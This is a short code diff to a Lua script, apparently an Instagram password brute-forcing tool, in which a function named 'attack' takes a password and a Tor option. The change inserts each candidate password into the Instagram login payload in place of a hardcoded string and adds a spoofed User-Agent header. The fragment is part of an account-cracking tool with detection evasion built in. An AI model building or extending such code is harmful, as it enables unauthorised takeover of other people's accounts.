@@ -33,8 +33,9 @@ local request_headers = nil
 
 local function attack(password, tor)
 	-- Generating fake user agent
-	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":sudopacmandeleteme17G"
-
+	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":" .. password
+	request_headers["User-Agent"] = fake_Agent()
+	
 	print(request_payload)
 	Wait(3)
 	for x,v in pairs(request_headers) do
